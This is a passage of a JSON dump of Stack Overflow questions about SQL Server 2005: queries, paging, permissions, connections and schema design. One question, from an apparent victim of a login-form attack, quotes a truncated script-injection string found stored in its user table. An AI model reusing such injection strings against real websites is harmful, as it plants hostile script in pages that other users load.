import=\"model.Item\"%&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"&gt;\n&lt;title&gt;Todo-List App&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h2&gt;Add a new item&lt;/h2&gt;\n&lt;form action=\"addItem\" method=\"post\"&gt;\n&lt;table&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;input type=\"text\" value=\"I have to...\" onClick=\"this.value('')\" name=\"todo\"/&gt;&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"submit\" value=\"Send\" name=\"send\"/&gt; &lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n&lt;/form&gt;\n&lt;h2&gt;Todo-List&lt;/h2&gt;\n&lt;%\nItem item = new Item();\nString[] lastest = item.lastItems();\nfor(int i=0;i&lt;lastest.length;i++)\n{%&gt;\n&lt;%=lastest[i] %&gt; &lt;br&gt;\n&lt;%}item.disconnect();\n%&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["windows","sql-server-2005","tomcat","waffle","sqljdbc"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":12804614,"title":"restarting tomcat after redeploying a web application","body":"<p>Hi I'm using tomcat and using Waffle for windows authentication.  I'm also connecting to an SQL server using the windows credentials too using microsoft's driver.  I have a problem that everytime I reload or redeploy the application, i have to restart tomcat.  After some googling i've discovered that the dll was already loaded and thus cannot be reloaded.</p>\n\n<p>I really need to redeploy application as i would need to update some functionality and it is very frustrating to ask the administrator to restart tomcat everytime i update the application.</p>\n\n<p>When i was doing the same with glassfish i managed to work around this issue somehow, but cannot manage with tomcat</p>\n"},{"tags":["sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12784211,"title":"Move SQL Server database modification between development and live database without data","body":"<p>I am working with SQL Server and I have two databases - one for development and another one for a live users.</p>\n\n<p>I want a way to move the changes (create new tables, SP, functions, modifications, relations, indexes) from development database to a live database automatically</p>\n\n<p>now I am copy the script for each element and execute it on the live database</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","text","nvarchar"],"answer_count":6,"favorite_count":5,"up_vote_count":42,"down_vote_count":0,"view_count":12537,"score":42,"question_id":2133946,"title":"nvarchar(max) vs NText","body":"<p>What are the advantages and disadvantages of using the <code>nvarchar(max)</code> vs. <code>NText</code> data types in SQL Server? I don't need backward compatibility, so it is fine that <code>nvarchar(max)</code> isn't supported in older SQL Server releases.</p>\n\n<p><strong>Edit:</strong> Apparently the question also applies to <code>TEXT</code> and <code>IMAGE</code> vs. <code>varchar(max)</code> and <code>varbinary(max)</code>, for those searching for those data-types later.</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12801308,"title":"TSQL get all orders that have specific code in history","body":"<p>I have a table that holds status changes for orders:</p>\n\n<pre><code>ORDER_ID  |  CHANGE_DATE      |  CODE_1  |  CODE_2  |  CODE_3\n=============================================================\n1         |  2012-09-01 12:20 |  Z1      |  NULL    |  NULL\n1         |  2012-09-01 12:21 |  Z2      |  S01     |  NULL\n1         |  2012-09-01 12:22 |  Z2      |  S04     |  NULL\n2         |  2012-09-01 12:22 |  Z1      |  S01     |  NULL\n3         |  2012-09-01 12:23 |  Z1      |  S03     |  NULL\n1         |  2012-09-01 12:24 |  Z1      |  S02     |  NULL\n2         |  2012-09-01 12:29 |  Z1      |  S05     |  NULL\n1         |  2012-09-01 13:29 |  Z5      |  T01     |  X01\n2         |  2012-09-01 13:31 |  Z1      |  T01     |  NULL\n</code></pre>\n\n<p>I need to select ORDER_ID for every order that has in history CODE_2 IN (S01,S02,S03) but don't have S04 and S05 after them.</p>\n\n<p>In this specific case query should return order 1 because after CODE_2 there is no S04 and S05, please notice that order 1 had S04 in history, but after that it had code S02.\nIt should also return order 3 because of code S03.\nOrder 2 shouldn't be returned because last code in his history is S05 (last from S group).</p>\n\n<p>Can I do this without joining to other table? I would like to select ORDER_ID only from this table.</p>\n"},{"tags":["sql","sql-server-2005","tsql","sql-server-2008","format"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2502,"score":3,"question_id":6469683,"title":"Format() function doesn't work?","body":"<p>I am trying to execute following built-in function in sql but it gives me error that this  function doesn't exist </p>\n\n<p>my query:</p>\n\n<pre><code>select EmpId, EmpName, format(EmpJoinDate, \"YYYY-DD-MM\") as date from Employee\n</code></pre>\n\n<p>Error i am getting:</p>\n\n<pre><code>'format' is not a recognized built-in function name\n</code></pre>\n\n<p>What may be  the problem, or what am i doing wrong? </p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":26,"score":-3,"question_id":12800947,"title":"create table for more categories","body":"<blockquote>\n  <p>I need to know the suitable way to create table with these info(<strong>ID\n  Category  Subcategory</strong>) .</p>\n  \n  <p>as the category have more subcategories , but also i can add new sub ,\n  sub category in the future , I tried to create to two table for \n  category and subcategory but I will face vital problem on the future \n  when I need to add new sub sub category .</p>\n  \n  <p><strong>So how can solve this issue?</strong></p>\n</blockquote>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":608,"score":0,"question_id":6223838,"title":"How to convert rows values into column in sql server 2005","body":"<p>How to convert row into column.I have following result set.</p>\n\n<pre><code>UserID  VendorName  QuestionText AnswerText\n1         KK         abc1         ans1\n1         KK         abc2         ans2\n1         KK         abc3         ans3\n2         JJ         abc1         ans2\n2         JJ         abc2         ans3\n2         JJ         abc3         ans1   \n</code></pre>\n\n<p>OUTPUT should be:</p>\n\n<pre><code>UserID VendorName   abc1    abc2   abc3\n1             KK    ans1    ans2   ans3\n2             JJ    ans2    ans3   ans1\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12384014,"title":"Create Scheduled Job in SQL Server that checks for an alert condition in table data","body":"<p>How do I setup a scheduled job on SQL Server database that checks for an alert \ncondition say change in the table column variance and executes a cmd that sends an email \nalert when data in the variance column is in the 10-15 range</p>\n\n<p>The columns in the database tables will be dynamic...the user must be able to select and set alert on any of the database table columns dynamically and check for an alert condition</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","alter-table","notnull"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12799636,"title":"SQL Server: set varchar to not null when column size is unknown","body":"<p>I'm trying to create a script that when run against a DB takes a column and sets it to NOT NULL.</p>\n\n<p>The column is supposed to be a VARCHAR(50), and if I knew it hadn't been changed this would be a piece of cake, However, I can't be certain that no one has altered the length, so I need to make sure I don't reduce the size of the column if for example it's been increased to 100 by someone else.</p>\n\n<p>I was hoping I could do something like this, but it doesn't seem to work (assume I've already made sure there are no NULL values):</p>\n\n<pre><code>DECLARE @myColumnLength INT\n\nSET @myColumnLength = (\n    SELECT character_maximum_length\n    FROM information_schema.columns\n    WHERE table_name = 'mytable'\n    AND column_name = 'mycolumn'\n)\n\nALTER TABLE mytable\n    ALTER COLUMN mycolumn VARCHAR(@myColumnLength) NOT NULL \n</code></pre>\n\n<p>Any ideas? Am I attacking the problem in a wrong way? It would seem logical there'd be a way to set a column to NOT NULL without altering the column size, but my Google-fu is failing me today.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2","information-schema"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12793070,"title":"Deny access to information schema in SQL Server","body":"<p>I am looking for the best way to disable access to the <code>sys.tables</code> / <code>Information Schema</code> for a user / group in SQL Server.</p>\n\n<p>I found <a href=\"http://www.derkeiler.com/Newsgroups/microsoft.public.sqlserver.security/2008-09/msg00088.html\" rel=\"nofollow\">this thread from 2008 </a></p>\n\n<p>It shows a way how to deny access on <code>[sys].[something]</code> like so:</p>\n\n<pre><code> DENY SELECT ON [sys].[columns] TO DenySystemTableSelectRole\n GO\n DENY SELECT ON [sys].[tables] TO DenySystemTableSelectRole\n GO\n DENY SELECT ON [sys].[syscolumns] TO DenySystemTableSelectRole\n GO\n DENY SELECT ON [sys].[sysobjects] TO DenySystemTableSelectRole\n GO\n</code></pre>\n\n<p>But no way how to disable access on the <code>Information Schema</code>:</p>\n\n<pre><code>DENY SELECT ON INFORMATION_SCHEMA.TABLES To DenySystemTableSelectRole\n</code></pre>\n\n<p>This seems not to work.</p>\n\n<p>How can I disable access to information_schema?</p>\n\n<p>And is there an easier way disable access to all <code>sys</code> / <code>information_schema</code>?</p>\n\n<p><strong>Update:</strong>\nActually I can not run both ot the following statements:</p>\n\n<pre><code>DENY SELECT ON [sys] TO reducedDBO\nGO\nDENY SELECT ON INFORMATION_SCHEMA To reducedDBO\nGO\n</code></pre>\n\n<p>I tried to run them on the specific DB where the User exists, and I also tried on the \"master\".</p>\n\n<p>I still can run:</p>\n\n<pre><code> SELECT * from\n INFORMATION_SCHEMA.TABLES \n</code></pre>\n\n<p>-->still returns results</p>\n\n<pre><code> SELECT * from\n sys.TABLES \n</code></pre>\n\n<p>-->no results anymore</p>\n\n<p>Including <code>SCHEMA::</code> in the query made it possible to create the securables</p>\n\n<pre><code>DENY SELECT ON SCHEMA::[sys] TO reducedDBO\nGO\nDENY SELECT ON SCHEMA::INFORMATION_SCHEMA To reducedDBO\nGO\n</code></pre>\n\n<p>But now I still can select all the information from the DB.</p>\n\n<p>I had a look at the \"Securables\"-Tab in the users Property-window in Management Studio 2008, it looks like this:</p>\n\n<p><em>Entry that does block the selecion of sys.tables</em></p>\n\n<p>Schema:sys, Name:tables, Type:View </p>\n\n<p>Permissions for sys.tables: Permission:Select, Grantor:dbo, Deny is checked</p>\n\n<p><em>Entry that do not block any selection</em></p>\n\n<p>Schema:, Name:INFORMATION_SCHEMA, Type:Schema </p>\n\n<p>Permissions for INFORMATION_SCHEMA: Permission:Select, Grantor:dbo, Deny is NOT checked (I tried to check it, but no chance..)</p>\n\n<p>Permission:Select, Grantor:INFORMATION_SCHEMA, Deny is checked</p>\n\n<hr>\n\n<p>I tried to set the permissions over the GUI, but then I get the same error that setting permissions would be possible only on the master DB.\nBut I not have the user/login added to the master DBs security.</p>\n\n<p><strong>Solution:</strong></p>\n\n<p>The only way I could make the <code>deny</code> work for the <code>information_schema</code> was to <strong>add the user to the master-db</strong> and run the <code>deny select</code> on the master:</p>\n\n<pre><code>DENY SELECT ON [sys].[tables] TO reducedDBO\nGO\nDENY SELECT ON INFORMATION_SCHEMA.TABLES To reducedDBO\nGO\n</code></pre>\n\n<p>And as in this code, it can only be executed for single tables.</p>\n"},{"tags":["sql-server","sql-server-2005","character-encoding","ssms","rpt"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":2240,"score":6,"question_id":10538162,"title":"Convert SSMS .rpt output file to .txt/.csv","body":"<p>I want to export my big SSMS (SQL Server Management Studio) query result (2.5m lines, 9 fields) as .csv or comma-delimited .txt (with headings). (MS SQL Server 2005 Management Studio.)</p>\n\n<p>So that I can then either read it line-by-line into VBA program (to do certain calculations on the data) or do queries on it in Excel (e.g. with Microsoft Query). The calculations are complicated and I prefer to do it somewhere else than SSMS. </p>\n\n<p>If I choose ‘query result to text’ in SSMS and a small answer (few lines e.g. up to 200k) I could of course simply copy and paste to a text editor. For my large answer here I could of course copy and paste 200k or so lines at a time, 10 times, into a text editor like Ultra-Edit. (When I try all 2.5m at once, I get a memory warning inside SSMS.) But for the future I’d like a more elegant solution.</p>\n\n<p>For ‘query result to file’, SSMS writes to an .rpt file always.  (When you right-click in the results window and choose ‘save as’, it gives a memory error just like above.) </p>\n\n<p>--> So it looks like my only option is to have SSMS output its result to a file i.e. .rpt and then afterwards, convert the .rpt to .txt.</p>\n\n<p>I assume this .rpt is a Crystal Reports file? Or isn't it. I don’t have Crystal Reports on my PC, so I cannot use that to convert the file.</p>\n\n<p>When opening the .rpt in Ultra-Edit it looks fine. However in Microsoft Query in Excel, the headings doesn’t want to show.</p>\n\n<p>When I simply read &amp; write the .rpt using VBA, the file halves in size. (330meg to 180meg). In Microsoft Query the headings do show now (though the first field name has a funny leading character, which has happened to me before in other totally different situations). I do seem to be able to do meaningful pivot tables on it in Excel.</p>\n\n<p>However when I open this new file in Ultra-Edit, it shows Chinese characters! Could there still be some funny characters in it somewhere?</p>\n\n<p>--> Is there perhaps a free (and simple/ safe) converter app available somewhere. Or should I just trust that this .txt is fine for reading into my VBA program.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","paging"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12774625,"title":"Paging in SQL Server problems","body":"<p>I have searched for paging in SQL Server. I found most of the solution look like that</p>\n\n<p><a href=\"http://stackoverflow.com/questions/109232/what-is-the-best-way-to-paginate-results-in-sql-server\">What is the best way to paginate results in SQL Server</a></p>\n\n<p>But it don't meet my expectation. </p>\n\n<p>Here is my situation:</p>\n\n<p>I work on JasperReport, for that: to export the report I just need pass the any Select query into the template, it will auto generated out the report</p>\n\n<p>EX : I have a select query like this: </p>\n\n<pre><code>Select * from table A\n</code></pre>\n\n<p>I don't know any column names in table A. So I can't use </p>\n\n<pre><code>Select ROW_NUMBER() Over (Order By columsName)\n</code></pre>\n\n<p>And I also don't want it order by any columns.</p>\n\n<p>Anyone can help me do it?</p>\n\n<p>PS: In Oracle , it have rownum very helpful in this case.</p>\n\n<pre><code>Select * from tableA where rownum &gt; 100 and rownum &lt;200\n</code></pre>\n\n<p><a href=\"http://stackoverflow.com/questions/241622/paging-with-oracle\">Paging with Oracle</a></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":12790685,"title":"SQL Server 2005 Query for getting multiple records which have same pattern in QC project database","body":"<p>We access the SQL Server 2005 server from the QC Application.</p>\n\n<p>In order to access the data present in the SQL Server 2005 server we use the Dash Board Module in Quality Center Application.</p>\n\n<p>Sorry I could not post images as I am a fresher to stackoverflow.</p>\n\n<p>When I execute the below query I recieved two rows as output.</p>\n\n<pre><code>SELECT *\nFROM CYCL_FOLD\nWHERE CF_ITEM_NAME LIKE  '%Quality Center%'\n</code></pre>\n\n<p>When I parameterised the entity and when I am using LIKE cause it is returning only row.</p>\n\n<pre><code>SELECT *\nFROM CYCL_FOLD\nWHERE CF_ITEM_NAME LIKE   @FOLDER_NAME@\n</code></pre>\n\n<p>Please let me know how to get multiple rows using like clause.</p>\n"},{"tags":["php","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12791035,"title":"How can I connect to a remote SQL Server 2005 database using PHP/PDO?","body":"<p>I'm using the following code:</p>\n\n<pre><code>$serverName = \"&lt;specific_name&gt;.domain.com.au\\&lt;instancename&gt;\";\n\ntry{\n    $conn = new PDO( \"sqlsrv:Server=$serverName;Database=&lt;dbname&gt;\", \"\", \"\");\n    $conn-&gt;setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );\n}\ncatch(Exception $e)     {\n    die( print_r( $e-&gt;getMessage() ) );\n}\n\ninclude_once('&lt;success_view&gt;');\n</code></pre>\n\n<p>I'm getting the following error:</p>\n\n<pre><code>SQLSTATE[08001]: [Microsoft][SQL Server Native Client 10.0]Named Pipes Provider: Could not open a connection to SQL Server [53]. 1\n</code></pre>\n\n<p>I can ping the DB server, and it has Windows authentication enabled (which is why I'm providing blank user/pass. Wouldn't work even with a specific account, though.)  I checked that the server also has named pipes enabled (1. Shared memory 2. Named Pipes 3.TCP/IP).</p>\n\n<p>I'm using PHP 5.3.9 on IIS7/Windows 7. </p>\n"},{"tags":["sql","tsql","sql-server-2005","sql-server-2005-express"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":53,"score":-1,"question_id":12790139,"title":"SQL server column alias from another query","body":"<p>Why does this code not work in SQL Server 2005?</p>\n\n<pre><code>select c.price AS (select CityName from Cities ci where ci.cityid= c.cityid)\nfrom prices c\nwhere cityid=1\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","auto-increment"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":4668,"score":3,"question_id":4810627,"title":"SQL Server 2005 ROW_NUMBER() without OVER","body":"<p>I am trying to insert from one table into another using</p>\n\n<pre><code>DECLARE @IDOffset int;\nSELECT @IDOffset = MAX(ISNULL(ID,0)) FROM TargetTable\n\nINSERT INTO TargetTable(ID, FIELD)\nSELECT [Increment] + @IDOffset ,FeildValue\nFROM SourceTable\nWHERE [somecondition]\n</code></pre>\n\n<p>TargetTable.ID is not an identity column, which is why I have to find a way to auto-increment it myself. </p>\n\n<p>I know I can use a cursor, or create a table variable with an identity column and a FieldValue field, populate that, then use it in my <code>insert into...select</code>, but that is not very efficient. I tried using the ROW_NUMBER function to increment, but I really don't have a legitimate ORDER BY field in the SourceTable that I can use, and would like to keep the original order of the SourceTable (if possible).</p>\n\n<p>Can anyone suggest anything?</p>\n"},{"tags":["sql-server","sql-server-2005","synchronization"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":5424,"score":1,"question_id":1078368,"title":"How to synchronize two SQL Server 2005 databases?","body":"<p>I'm looking for a tool (best for free) which can synchronize two SQL Server 2005 databases.</p>\n\n<p>I have a sql database that is hosted on a server and another sql database that is hosted on aclient. Both have the same database schema. Each client has its own sql server because the application needs to run offline.</p>\n\n<p>The client is being connected to the company network regularly (each day). When the connection is being established, I would like to run a delta synchronization with the tool. Not all data from the server database is required on the client database, just a subset which is determined by the user of the client computer.</p>\n\n<p>Do you know a tool which supports this?</p>\n\n<p>Best Regards<br />Oliver Hanappi</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":47,"score":-6,"question_id":12788268,"title":"The Best Database Script With Query List For Best Practice \"SQL\"","body":"<p>Can any one give \nThe Best Database Script With Query List For Best Practice  \"SQL\".</p>\n\n<p>-Regards \n Dipan</p>\n"},{"tags":["sql","sql-server-2005","sum"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12783189,"title":"SQL SUM confusion","body":"<p>I have run the below query for my data:-</p>\n\n<pre><code>SELECT     CONTRACTNAME,\n           AccountNo,\n           TransDate, \n           JournalNo,\n           AuditTrail,           \n           Description,       \n           CONTRACTNUMBER,\n           GROUPING(CONTRACTNUMBER) as CONTRACTNUMBER,   \n           SUM(PAFeebillamount)as Total  \nFROM       SRVS.dbo.BTQGLDistributionsWithProjectCodesHM\nWHERE      TransDate &gt; '2012' AND CONTRACTNUMBER &lt;&gt; '00900'\nGROUP BY   CONTRACTNAME,  \n           AccountNo,   \n           TransDate,\n           JournalNo, \n           AuditTrail,    \n           Description,      \n           CONTRACTNUMBER with rollup  \nORDER BY   GROUPING (CONTRACTNUMBER) \n</code></pre>\n\n<p>this gives me the results:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/Qvu9S.png\" alt=\"enter image description here\"></p>\n\n<p>how can I change this so I get a single line Total for each contract number.  So it looks like the below example:-</p>\n\n<p><img src=\"http://i.stack.imgur.com/YukDc.png\" alt=\"enter image description here\"></p>\n\n<p>at this moment in time I am not bothered about the accnt no / journal no etc as it is only going to be a summary.</p>\n\n<p>Just looking for advice on best way to sum up my groups by contract number?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot","unpivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12782349,"title":"SQL Join Query - Group By / Aggregation","body":"<p>I realise this question has been asked before in many forms but I am struggling to apply every answer I've found to my specific table. To start - straight to the details.</p>\n\n<p>Table A has four columns (Unique ID, Number, Revision, Date). When executing a select * from A, the result set is as follows -</p>\n\n<pre><code>ID | Number | Revision | Date\n------------------------------------\n01 | 12345  | 1        | 01/01/2010\n02 | 12345  | 2        | 01/04/2010\n03 | 123    | 1        | 01/12/2010\n04 | 1234   | 1        | 09/09/2012\n05 | 12345  | 3        | 09/12/2012\n</code></pre>\n\n<p>I would like the dates for each Revision in a single row per Number, e.g. for Number 12345, the query would return</p>\n\n<pre><code>ID | Number | Revision | Date | Revision 2 | Revision 2 Date | Revision 3 | Revision 3 Date |\n---------------------------------------------------------------------------------------------\n01 | 12345  | 1 | 01/01/2010 |2  | 01/04/2010      | 3 |  09/12/2012|\n</code></pre>\n\n<p>I understand the syntax would be similar to</p>\n\n<pre><code>SELECT Revision, Date \nFROM (\nSELECT NUMBER \nFROM A) as B INNER JOIN ON a.Number = B.Number \nGROUP BY a.Number\n</code></pre>\n\n<p>However this still returns a row for each combination, I would like only the results shown above.</p>\n\n<p>I would appreciate any suggestions or hints!</p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12782507,"title":"For Loop based on Variable - SSIS","body":"<p>I have a script task in which I specify the variables like this:</p>\n\n<pre><code>Public Sub Main()\n\n    Dts.Variables(\"sTest\").Value = 1\n\n    Dts.TaskResult = Dts.Results.Success\nEnd Sub\n</code></pre>\n\n<p>The value for the variable is specified from a front-end code.</p>\n\n<p>Next I have a for loop container that internally contains a script task.</p>\n\n<p>I want to pass the variable that is dynamically entered in the external script task into the loop and hence execute a message box defined in the script task.</p>\n\n<p>The message box dynamically shows values as and when specified</p>\n\n<p><img src=\"http://i.stack.imgur.com/Uo2bc.png\" alt=\"enter image description here\"></p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12779540,"title":"SQL Grouping Error","body":"<p>I am running the below SQL but keep getting the error:- </p>\n\n<blockquote>\n  <p>'Column 'SRVS.dbo.BTQGLDistributionsWithProjectCodesHM.AccountNo' is invalid in the select list because it is not contained in either an\n  aggregate function or the GROUP BY clause.</p>\n</blockquote>\n\n<p>The code I am running is:-</p>\n\n<pre><code>SELECT         AccountNo, \n           TransDate, \n           JournalNo, \n           AuditTrail, \n           Description, \n           JnlAmount, \n           ACTINDX, \n           CONTRACTNAME, \n           PAPROJNUMBER,GROUPING(PAPROJNUMBER) as PAPROJNUMBER, \n           SUM(PAFeebillamount) as total\nFROM       SRVS.dbo.BTQGLDistributionsWithProjectCodesHM\nGROUP BY   PAPROJNUMBER with rollup\nORDER BY   GROUPING (PAPROJNUMBER\n</code></pre>\n\n<p>Can anyone point me in the correct direction on this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":295,"score":3,"question_id":647901,"title":"Algorithm for the following homework","body":"<p>You require an algorithm to read in one customer's account balance at the begining of the month, a total of all withdrawals for the month, and a total of all deposits made during the month. A federal tax charge of 1% is applied to all transactions made during the month. The program is to calculate the account balance at end of the month by (1) subtracting the total withdrawals from the account balance at the beginning of the month, (2) adding the total deposits to new balance, (3) calculating the federal tax (1% of total transactions - that is, total withdrawals+total deposits), and (4) subtracting this federal tax from the new balance. After these calculations, print the final end-of-month balance. </p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12779005,"title":"Table schema to store daily hits for many items?","body":"<p>In my Sql Server 2005 database, I'm considering two ways of creating a table to track daily views on 100,000 items:</p>\n\n<p>Option 1) Each day would insert a new row for each item. So the table columns would look like this:  </p>\n\n<pre><code>| ItemID | Date | #ofHits |  \n</code></pre>\n\n<p>That would mean the table grows by 100,000 rows per day.  </p>\n\n<p>Option 2) Each row would contain an entire month's hits per item. So the table columns would look like this:  </p>\n\n<pre><code>| ItemID | Year | Month | Day01Hits | Day02Hits | Day03Hits | ... | Day31Hits |\n</code></pre>\n\n<p>That would mean the tables grows by 100,000 rows per month.  </p>\n\n<p>Option 3) Perhaps you have a better idea altogether?  </p>\n\n<p>Keep in mind performance, such as when doing a sum of all hits between two dates (i.e. total hits for July 5th-Aug12th). Also, I'd want to keep at least 1 year of historical data.</p>\n\n<p>On a related note, we're simply parsing the IIS logs nightly to get the hit data.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":408,"score":0,"question_id":3098879,"title":"TSQL Reverse FOR XML Encoding","body":"<p>I am using FOR XML in a query to join multiple rows together, but the text contains quotes, \"&lt;\", \">\", etc.  I need the actual character instead of the encoded value like \"&quot;\" etc.  Any suggestions?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","loops","while-loop"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":7989,"score":2,"question_id":1725379,"title":"sql while loop with date counter","body":"<p>I need to do something like this in sql:</p>\n\n<pre><code>declare @StartDate varchar(10)\ndeclare @EndDate varchar(10)\nset @StartDate='12/31/2008'\nset @EndDate='1/11/2009'\n\nDeclare @date varchar = @StartDate\nwhile (@date &lt;= @EndDate)\nbegin\n -- some statements\nset @date += 1 -- basically increment by 1 day\nend\n</code></pre>\n\n<p>How can I do the above correctly in SQL?  Basically, my startdate and enddate are strings and not datetimes because my business logic is referencing string column in another table with a date as the name of the column-But I need to loop through a bunch of columns, each column having the name of the next day's date.</p>\n\n<p>If the date is 11/07/2009, the name of the column would be '11/7/2009' (without the 0 in the 7), so I have to watch out for that too.</p>\n\n<p>Any help is appreciated!</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":4007,"score":4,"question_id":7388420,"title":"get DATEDIFF excluding weekends using sql server","body":"<p>I am using this query to get time taken.</p>\n\n<pre><code>SELECT DATEDIFF(dd, ActualStartDate, ActualCompletionDate) AS TimeTaken\nFROM TableName\n</code></pre>\n\n<p>Now I want to exclude weekends and only include Mon-Fri as days counted.</p>\n"},{"tags":["sql","sql-server-2005","sql-injection","injection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12775644,"title":"Username and password injected in my table","body":"<p>I am new to asp.net development</p>\n\n<p>I develop login form with username and password </p>\n\n<p>I finished off with my work but any how my <code>login</code> table has injected with sort of script as </p>\n\n<p>username</p>\n\n<pre><code>\"&gt; &lt;/title&gt;&lt;script src=\"http://it\n</code></pre>\n\n<p>password</p>\n\n<pre><code>\"&gt; &lt;/title&gt;&lt;script src=\"http://it\n</code></pre>\n\n<p>I have written simple query as </p>\n\n<pre><code>SELECT * FROM user WHERE userid = 'admin' AND password = 'ms2012'\n</code></pre>\n\n<p>I thought some body has injected in a username and password textbox</p>\n\n<p>But I don't understand how they did. Can anybody explain <strong>how they have updated it</strong> and <strong>what should I do to avoid it?</strong></p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":232,"score":0,"question_id":11047612,"title":"List All Tables Modified in Last N Days","body":"<p>How to get the list of all tables modified in the last <em>N</em> days?</p>\n"},{"tags":["sql","sql-server-2005","types"],"answer_count":3,"favorite_count":1,"up_vote_count":9,"down_vote_count":1,"view_count":459,"score":8,"question_id":4869539,"title":"Is There ANY Sense in SQL Data Type VARCHAR(1)?","body":"<p>I've bumped into a lot of VARCHAR(1) fields in a database I've recently had to work with.  I rolled my eyes: obviously the designer didn't have a clue.  But maybe I'm the one who needs to learn something.  Is there any conceivable reason to use a VARCHAR(1) data type rather than CHAR(1)?  I would think that the RDMS would convert the one to the other automatically.</p>\n\n<p>The database is MS SQL 2K5, but evolved from Access back in the day.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12770105,"title":"Is there any way to run the definition of multiple stored procedure at a time?","body":"<p>I have created the definition of more than 200 stored procedures. My problem is that I have to execute them on a different server and on a different database.\nThe process which I am following is that first I check each stored procedure that it exists on that server and database or not. If not then I create them else I drop the earlier definition and create the new one.</p>\n\n<p>So I just wanted to know that is there any other way out. As I have to perform this activity for each stored procedure. I want to create a script or so, which can run and create the definition of all my stored procedure on the server and database.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12769991,"title":"How to execute multiple stored procedures at a time?","body":"<p>I want to know that is there any way through which I can execute all my stored procedure at a time.\nPresently I am executing each stored procedure using <code>exec \"Stored Procedure name\"</code> command.\nAnd I have more than 200 stored procedure to be executed on my database.</p>\n\n<p>Is there any easy way out to execute all these stored procedure at a single time as it is difficult for me to keep a track of them?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12756223,"title":"T-SQL: Count and Group By Across Multiple Columns","body":"<p>I have the following 